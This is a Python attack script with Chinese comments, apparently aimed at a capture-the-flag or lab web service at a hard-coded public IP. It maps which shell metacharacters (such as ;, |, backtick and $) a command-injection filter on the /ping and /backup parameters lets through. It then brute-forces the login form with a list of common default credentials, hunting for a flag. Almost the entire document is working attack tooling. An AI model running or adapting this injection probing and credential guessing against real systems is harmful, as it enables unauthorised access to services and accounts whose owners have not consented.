import requests
import re
import os
import time

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("分析Blocked机制 - 找出具体过滤了什么")
print("="*70)

# 测试哪些字符被过滤
test_chars = [
    ("127.0.0.1", "纯IP"),
    ("127.0.0.1a", "IP+字母"),
    ("127.0.0.1 ", "IP+空格"),
    ("127.0.0.1\t", "IP+制表符"),
    ("127.0.0.1.", "IP+点"),
    ("127.0.0.1-", "IP+减号"),
    ("127.0.0.1_", "IP+下划线"),
    ("127.0.0.1+", "IP+加号"),
    ("127.0.0.1=", "IP+等号"),
    ("127.0.0.1@", "IP+@"),
    ("127.0.0.1#", "IP+#"),
    ("127.0.0.1$", "IP+$"),
    ("127.0.0.1%", "IP+%"),
    ("127.0.0.1^", "IP+^"),
    ("127.0.0.1*", "IP+*"),
    ("127.0.0.1(", "IP+("),
    ("127.0.0.1)", "IP+)"),
    ("127.0.0.1[", "IP+["),
    ("127.0.0.1]", "IP+]"),
    ("127.0.0.1{", "IP+{"),
    ("127.0.0.1}", "IP+}"),
    ("127.0.0.1|", "IP+|"),
    ("127.0.0.1\\", "IP+\\"),
    ("127.0.0.1/", "IP+/"),
    ("127.0.0.1:", "IP+:"),
    ("127.0.0.1;", "IP+;"),
    ("127.0.0.1<", "IP+<"),
    ("127.0.0.1>", "IP+>"),
    ("127.0.0.1,", "IP+,"),
    ("127.0.0.1?", "IP+?"),
    ("127.0.0.1!", "IP+!"),
    ("127.0.0.1`", "IP+反引号"),
    ("127.0.0.1'", "IP+单引号"),
    ('127.0.0.1"', 'IP+双引号'),
]

blocked_chars = []
allowed_chars = []

for payload, desc in test_chars:
    try:
        r = session.get(f"{TARGET}/ping", params={"host": payload}, timeout=15)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                if "Blocked" in content:
                    blocked_chars.append(desc)
                else:
                    allowed_chars.append(desc)
    except:
        pass

print(f"\n被Blocked的字符: {blocked_chars}")
print(f"\n允许的字符: {allowed_chars}")

# 分析Backup的Blocked机制
print("\n" + "="*70)
print("分析Backup Blocked机制")
print("="*70)

backup_test_chars = [
    ("F:\\small peoject\\python-lab\\uploads", "基本路径"),
    ("F:\\small peoject\\python-lab\\uploads\\", "路径+反斜杠"),
    ("F:\\small peoject\\python-lab\\uploads/", "路径+正斜杠"),
    ("F:\\small peoject\\python-lab\\uploads.", "路径+点"),
    ("F:\\small peoject\\python-lab\\uploads-", "路径+减号"),
    ("F:\\small peoject\\python-lab\\uploads ", "路径+空格"),
    ("F:\\small peoject\\python-lab\\uploads|", "路径+|"),
    ("F:\\small peoject\\python-lab\\uploads&", "路径+&"),
    ("F:\\small peoject\\python-lab\\uploads;", "路径+;"),
]

blocked_backup = []
allowed_backup = []

for payload, desc in backup_test_chars:
    try:
        r = session.get(f"{TARGET}/backup", params={"path": payload}, timeout=15)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                if "Blocked" in content:
                    blocked_backup.append(desc)
                else:
                    allowed_backup.append(desc)
    except:
        pass

print(f"\n被Blocked的Backup字符: {blocked_backup}")
print(f"\n允许的Backup字符: {allowed_backup}")

print("\n" + "="*70)
print("尝试登录（避免速率限制）")
print("="*70)

# 清除session，获取新的CSRF
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

time.sleep(60)  # 等待速率限制解除

r = session.get(f"{TARGET}/login", timeout=15)
csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
csrf_token = csrf.group(1) if csrf else ""

print(f"CSRF Token: {csrf_token}")

# 尝试一些可能的凭据（根据提示和页面内容）
credentials = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "term3lab"),
    ("term3lab", "term3lab"),
    ("ctf", "ctf"),
    ("flag", "flag"),
    ("player", "player"),
    ("test", "test"),
    ("demo", "demo"),
    ("guest", "guest"),
    ("root", "root"),
    ("user", "user"),
    ("admin", "password"),
    ("admin", "pass"),
    ("admin", "123"),
    ("admin", "abc123"),
    ("admin", "qwerty"),
    ("admin", "letmein"),
    ("admin", "welcome"),
    ("admin", "monkey"),
    ("admin", "dragon"),
    ("admin", "master"),
    ("admin", "login"),
    ("admin", "admin123"),
    ("admin", "admin@123"),
    ("admin", "Admin123"),
    ("Admin", "Admin"),
    ("Admin", "admin"),
    ("Administrator", "Administrator"),
]

found_flag = False
for username, password in credentials:
    try:
        data = {"username": username, "password": password, "csrf": csrf_token}
        r = session.post(f"{TARGET}/login", data=data, timeout=15, allow_redirects=False)
        
        print(f"\n>>> {username}/{password}")
        print(f"状态码: {r.status_code}")
        
        # 检查是否有重定向（登录成功通常会重定向）
        if r.status_code in [302, 301]:
            print(f"⚠️ 有重定向!")
            print(f"重定向到: {r.headers.get('Location', '')}")
            
            # 获取重定向后的内容
            redirect_url = r.headers.get('Location', '')
            if redirect_url:
                r2 = session.get(f"{TARGET}{redirect_url}", timeout=15)
                print(f"重定向页面内容:")
                print(f"状态码: {r2.status_code}")
                print(f"内容: {r2.text}")
                
                # 搜索flag
                flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                    found_flag = True
                    break
        
        # 检查响应内容
        if "用户名或密码错误" not in r.text:
            print(f"⚠️ 可能登录成功!")
            print(f"响应内容: {r.text}")
            
            # 搜索flag
            flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                found_flag = True
                break
        
        time.sleep(2)  # 避免速率限制
    except Exception as e:
        print(f"错误: {e}")

if not found_flag:
    print("\n登录凭据未找到")

print("\n测试完成")